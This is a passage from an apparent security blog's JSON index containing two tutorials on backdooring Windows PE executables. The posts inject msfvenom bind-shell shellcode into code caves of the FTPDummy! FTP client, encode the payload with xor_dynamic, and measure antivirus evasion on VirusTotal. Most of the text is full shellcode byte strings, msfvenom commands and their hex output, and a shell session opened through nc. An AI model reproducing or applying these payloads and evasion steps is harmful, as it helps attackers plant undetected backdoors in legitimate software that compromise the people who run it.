10\\xC6\\x00\\x44\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4E\\x56\\x56\\x53\\x56\\x68\\x79\\xCC\\x3F\\x86\\xFF\\xD5\\x89\\xE0\\x90\\x56\\x46\\xFF\\x30\\x68\\x08\\x87\\x1D\\x60\\xFF\\xD5\\xBB\\xF0\\xB5\\xA2\\x56\\x68\\xA6\\x95\\xBD\\x9D\\xFF\\xD5\\x3C\\x06\\x7C\\x0A\\x80\\xFB\\xE0\\x75\\x05\\xBB\\x47\\x13\\x72\\x6F\\x6A\\x00\\x53\\x81\\xC4\\x00\\x02\\x00\\x00\\x9D\\x61\\x68\\xB8\\x7F\\x49\\x00\\xE9\\xBA\\xF0\\xF5\\xFF\")print (shellcode)root@whitecr0wz:~# In this case, I chose the encoder x86/xor_dynamic, as it is very effective, and it is not very well known.root@whitecr0wz:~# python custom.py | msfvenom -p - --platform windows -a x86 -e x86/xor_dynamic -n 5 -f hex Attempting to read payload from STDIN...Found 1 compatible encodersAttempting to encode payload with 1 iterations of x86/xor_dynamicx86/xor_dynamic succeeded with size 393 (iteration=0)x86/xor_dynamic chosen with final size 393Successfully added NOP sled of size 5 from x86/single_bytePayload size: 398 bytesFinal size of hex file: 796 bytes27f52ff83feb235b89dfb06ffcae75fd89f989de8a0630074766813f0641740846803e6f75eeebeaffe1e8d8ffffff276f47bbdbcfa527272747aec216e743ac7717ac752bac7533ac550f28906d0116d88b1b465b250b07e6e82a26e0c5d57570ac7537ac6d1bac6b365fc46f26f676ac7e0726f4ac6e3fc41d6eac13ac26f116d88be6e82a26e01fc752d1245adf1c5a0352c37fac7f0326f441ac2b6cac7f3b26f4ac23ac26f7ae6303037c7c467e7d76d8c778787dac35ccaa7a4f141527274f50541578734f6b500120d8f29fb72627270ee373774f0ea74c27d8f24d2f7e77c5da677767774fcd28f8c7d8f2b04f2527040faec14d3771704fe5fc1040d8f2704f90ce1fd8d8f2704f53cb1cc6d8f270b04f52496a46d8f24f444a4327aec470707016d14d357e71c5da41e063031b2626aa630337e127637377717171617169717174714f5eeb18a1d8f2aec7b77161d8174f2fa03a47d8f29cd79285714f81b29abad8f21b215b2da7dcc752229c603455484d2774a6e327252727ba464f9f586e27ce9dd7d2d82d0641root@whitecr0wz:~# As seen, the payload has grown in terms of size, this will make the last JMP useless, we will take care of it later on.The entire chain of characters is removed with “Fill with 00”.The encoded payload is pasted with “Binary paste”.When the function is not loaded, the shellcode remains encoded. Nevertheless, when interacted with, it will decode itself. As it is required to modify the last instruction, it will be interacted with.Last section of the payload before decoding.After decoding.Interesting, our JMP no longer points to 0040342B. Instead, it directs the flow to 0040345C. With this configuration, our backdoor will never work properly! Let’s make some modifications.As seen on the image, the second opcode of the JMP, BA, has been replaced for 89, meaning that this is the byte that should be replaced in our custom.py.Python script (the only arranged change is at the five last hex characters):root@whitecr0wz:~# cat custom.py shellcode = (\"\\x60\\x9C\\xFC\\xE8\\x82\\x00\\x00\\x00\\x60\\x89\\xE5\\x31\\xC0\\x64\\x8B\\x50\\x30\\x8B\\x52\\x0C\\x8B\\x52\\x14\\x8B\\x72\\x28\\x0F\\xB7\\x4A\\x26\\x31\\xFF\\xAC\\x3C\\x61\\x7C\\x02\\x2C\\x20\\xC1\\xCF\\x0D\\x01\\xC7\\xE2\\xF2\\x52\\x57\\x8B\\x52\\x10\\x8B\\x4A\\x3C\\x8B\\x4C\\x11\\x78\\xE3\\x48\\x01\\xD1\\x51\\x8B\\x59\\x20\\x01\\xD3\\x8B\\x49\\x18\\xE3\\x3A\\x49\\x8B\\x34\\x8B\\x01\\xD6\\x31\\xFF\\xAC\\xC1\\xCF\\x0D\\x01\\xC7\\x38\\xE0\\x75\\xF6\\x03\\x7D\\xF8\\x3B\\x7D\\x24\\x75\\xE4\\x58\\x8B\\x58\\x24\\x01\\xD3\\x66\\x8B\\x0C\\x4B\\x8B\\x58\\x1C\\x01\\xD3\\x8B\\x04\\x8B\\x01\\xD0\\x89\\x44\\x24\\x24\\x5B\\x5B\\x61\\x59\\x5A\\x51\\xFF\\xE0\\x5F\\x5F\\x5A\\x8B\\x12\\xEB\\x8D\\x5D\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5F\\x54\\x68\\x4C\\x77\\x26\\x07\\xFF\\xD5\\xB8\\x90\\x01\\x00\\x00\\x29\\xC4\\x54\\x50\\x68\\x29\\x80\\x6B\\x00\\xFF\\xD5\\x6A\\x08\\x59\\x50\\xE2\\xFD\\x40\\x50\\x40\\x50\\x68\\xEA\\x0F\\xDF\\xE0\\xFF\\xD5\\x97\\x68\\x02\\x00\\x23\\x28\\x89\\xE6\\x6A\\x10\\x56\\x57\\x68\\xC2\\xDB\\x37\\x67\\xFF\\xD5\\x57\\x68\\xB7\\xE9\\x38\\xFF\\xFF\\xD5\\x57\\x68\\x74\\xEC\\x3B\\xE1\\xFF\\xD5\\x57\\x97\\x68\\x75\\x6E\\x4D\\x61\\xFF\\xD5\\x68\\x63\\x6D\\x64\\x00\\x89\\xE3\\x57\\x57\\x57\\x31\\xF6\\x6A\\x12\\x59\\x56\\xE2\\xFD\\x66\\xC7\\x44\\x24\\x3C\\x01\\x01\\x8D\\x44\\x24\\x10\\xC6\\x00\\x44\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4E\\x56\\x56\\x53\\x56\\x68\\x79\\xCC\\x3F\\x86\\xFF\\xD5\\x89\\xE0\\x90\\x56\\x46\\xFF\\x30\\x68\\x08\\x87\\x1D\\x60\\xFF\\xD5\\xBB\\xF0\\xB5\\xA2\\x56\\x68\\xA6\\x95\\xBD\\x9D\\xFF\\xD5\\x3C\\x06\\x7C\\x0A\\x80\\xFB\\xE0\\x75\\x05\\xBB\\x47\\x13\\x72\\x6F\\x6A\\x00\\x53\\x81\\xC4\\x00\\x02\\x00\\x00\\x9D\\x61\\x68\\xB8\\x7F\\x49\\x00\\xE9\\x89\\xF0\\xF5\\xFF\")print (shellcode)root@whitecr0wz:~# Generating the payload once again:root@whitecr0wz:~# python custom.py | msfvenom -p - --platform windows -a x86 -e x86/xor_dynamic -n 5 -f hex Attempting to read payload from STDIN...Found 1 compatible encodersAttempting to encode payload with 1 iterations of x86/xor_dynamicx86/xor_dynamic succeeded with size 393 (iteration=0)x86/xor_dynamic chosen with final size 393Successfully added NOP sled of size 5 from x86/single_bytePayload size: 398 bytesFinal size of hex file: 796 bytesf5982f933feb235b89dfb052fcae75fd89f989de8a0630074766813f723c740846803e5275eeebeaffe1e8d8ffffff275247bbdbcfa527272747aec216e743ac7717ac752bac7533ac550f28906d0116d88b1b465b250b07e6e82a26e0c5d57570ac7537ac6d1bac6b365fc46f26f676ac7e0726f4ac6e3fc41d6eac13ac26f116d88be6e82a26e01fc752d1245adf1c5a0352c37fac7f0326f441ac2b6cac7f3b26f4ac23ac26f7ae6303037c7c467e7d76d8c778787dac35ccaa7a4f141527274f50541578734f6b500120d8f29fb72627270ee373774f0ea74c27d8f24d2f7e77c5da677767774fcd28f8c7d8f2b04f2527040faec14d3771704fe5fc1040d8f2704f90ce1fd8d8f2704f53cb1cc6d8f270b04f52496a46d8f24f444a4327aec470707016d14d357e71c5da41e063031b2626aa630337e127637377717171617169717174714f5eeb18a1d8f2aec7b77161d8174f2fa03a47d8f29cd79285714f81b29abad8f21b215b2da7dcc752229c603455484d2774a6e327252727ba464f9f586e27ceaed7d2d82d723croot@whitecr0wz:~# Let’s repeat the previous process and save.EndGame #2VirusTotal results:From 18 to 0! This is beyond impressive! Thank you for reading this blog post!ReferencesCapt. Meelo’s post: https://captmeelo.com/exploitdev/osceprep/2018/07/21/backdoor101-part2.htmlOnline x86/x64 Assembler/Disassembler: https://defuse.ca/online-x86-assembler.htm#disassembly2" }, { "title": "Backdooring PE Files through Code Caves", "url": "/posts/Backdooring-PE/", "categories": "Backdooring", "tags": "assembly, shellcoding", "date": "2020-10-20 05:44:00 +0000", "snippet": "IntroductionBuilding malware is a topic which has always been from great interest to me. However, injecting malicious code within benign software seems a very concerning yet engrossing concept. PE Injection is pretty much the aforementioned example, embedding shellcode into a non-used fragment of code within a program which is commonly not flagged as a program.Normally, in order to achieve PE Injection or simply backdooring, there are two methods: Adding a new header with empty space into the program, through programs such as PE Lord or CFF Explorer. Using a Code Cave. An original section of the code which is not relevant to the execution.During this tutorial, i will exhibit the latter, this is due to the fact that adding a new header is very noisy regarding space when read by AV Software. On the other hand, Code Caves do not change space whatsoever, as the space is already being used, and there are no new headers.Time to get our hands dirty.Through the course of this post i will use FTPDummy! FTP Client to explain such concept, due to the reason that it is fast, lightweight, easy to use and does not have ASLR enabled on the main module, making things a little easier. You can get it here.Main menu of FTPDummy!In addition, i will be using VirusTotal in order to check how many AV Software products are capable of detecting the PE File.FTPDummy! when checked by VirusTotal.Furthermore, when it comes to finding code caves, i have chosen pycave.py, it requires Python 3.8 and the module PEFile.Revealed Code CavesAs revealed on the image, there are several Code Caves in the .rsrc section. In order to not worry at all with space issues, i’ll use 0x0052715E as it has 2814 bytes of spaces, according to pycave.py.The ProcessBefore stepping into how the backdooring is done, i think the whole process should be explained clearly.In order to backdoor, the following steps must be taken: The flow must be hijacked. This can be achieved through several methods I.E Replacing the entry point instruction for a JMP instruction pointing into the desired Code Cave. Also, more specific hijacking can be achieved, such as executing the JMP when executing a section of the code (I.E: Open Help, URL, Credits, or any other button). Nevertheless, due to the complexity of this last technique, it shall be reserved for the following post.Once EIP points towards the Code Cave, the next combination of instructions must be assembled. PUSHAD/PUSHFD instructions. These will save our registers/flags so that they are aligned later on. It is essential for the registers/flags to be aligned so that the instructions work perfectly according to the value of these. The Shellcode. Shellcode, we are used to it. Some modifications may need to be issued, such as the removal of the last instruction in some cases, as it tends to crash the flow and the modification of a byte which waits for the shellcode to exit for the main program to return its original flow. Alignment. The ESP Register must be restored to its old value. POPFD/POPAD. These instructions will restore our registers/flags. As when assembling the JMP on the entry point instruction some other instructions were replaced, these must be assembled once again so that the code runs as intended and does not crash!As explained previously, the initial instructions must be re-assembled later on. Due to this, these are saved.The instructions are copiedMoreover, the JMP instruction pointing to the Code Cave is assembled.As seen on the image, the instructions PUSH EBP, MOV EBP, ESP and PUSH -1 were the only affected.As it is required to save our progress (otherwise it would be pretty tiring to re-do every step), it can be saved by using the option “Copy to executable”.Select what you desired to save and click on “Save file”.Once the altered PE File is loaded, we now see that the JMP instruction is loaded as original.If it is stepped into the instruction (SHIFT+F7), the execution leads to the Code Caves:Before assembling the required instructions (PUSHAD/PUSHFD), assembling some NOPs can’t hurt anyone, just in case the execution does not get mangled.Where the fun is bornThe following step is introducing the shellcode. In this scenario, i have chosen a bind shell from msfvenom. Furthermore, in order to paste it into the debugger through a binary copy, the format must be hex.root@whitecr0wz:~# msfvenom -p windows/shell_bind_tcp LPORT=9000 -f hex [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 328 bytesFinal size of hex file: 656 bytesfce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a085950e2fd4050405068ea0fdfe0ffd597680200232889e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5If this program is submitted within the .exe format VirusTotal, it gives the following result.The empty space is selected and a binary paste is arranged.The code seems to have been pasted as expected.Now, on these circumstances, if we desired to follow the execution, the shellcode would be executed perfectly well. Nevertheless, the program would not, crashing whenever the shellcode exits. Let’s put this to the test.If the execution is run (SHIFT+F9), the shellcode will be executed.root@whitecr0wz:~# rlwrap nc 192.168.100.149 9000 -v 192.168.100.149: inverse host lookup failed: Unknown host(UNKNOWN) [192.168.100.149] 9000 (?) openMicrosoft Windows [Version 6.1.7601]Copyright (c) 2009 Microsoft Corporation. All rights reserved.C:\\Users\\IEUser\\Desktop2\\FTPDummy_Code_Cave&gt;However, once exited, the program is terminated.Note: As explained previously, the shellcode will require some modifications. In this case, the program execution will not continue unless the shellcode has finished, in order to change this, replace the instruction commonly given in msfvenom payloads DEC ESI (4E), for a NOP.The next footstep on this technique is quite tricky, but quite simple. It consists in aligning the ESP value, i have done a small guide here.To put it very simple, a breakpoint must be inserted at the start of the payload and at the ending of such. Then, the difference between of these two values of ESP is calculated and added into the Register.Note: Another modification must be issued into the shellcode, being this one a NOP on the last instruction (CALL EBP). This is due to the fact that CALL EBP will end the execution.We see values 0x0012FF68 and 0x0012FD68. This easy problem can be solved with a program:#!/bin/bashprintf \"0x%X\\n\" $(($1 - $2)The calculation is done.root@whitecr0wz:~# hexcalc 0x0012FF68 0x0012FD680x200root@whitecr0wz:~#As the value is 0x200, the instruction should be “ADD ESP, 0x200”If you remember well, at the start of the post it was stated that it is required to re-assemble the replaced instructions for the JMP to the Code Cave. These were PUSH EBP, MOV EBP, ESP and PUSH -1. Finally, a JMP instruction shall be assembled to the next instruction of the original chain, which is, in our case, a PUSH instruction.Note: In these scenarios, a sign that the alignment was issued with no mistakes is the fact that the value of ESP is equal when the execution began.If the program is run and the flow resumes (SHIFT+F9), we see that the bind shellcode is arranged and FTPDummy! boots up when it is interacted with the shellcode.Escaping from the cat.Remember, when we first scanned our payload through Virus Total, it gave a result of 57/70. Let’s check how many AV Software products manage to flag our new PE File as malware.Even though there is much to work, from 57 to 26 is a great improvement. On the following post i will be explaining this same technique within profound sections of the program with encoding as well.Here is the PoC for you to enjoy. Thanks for reading!ReferencesCapt. Meelo’s post: https://captmeelo.com/exploitdev/osceprep/2018/07/21/backdoor101-part2.html.Online x86/x64 Assembler/Disassembler: https://defuse.ca/online-x86-assembler.htm#disassembly2." } ]
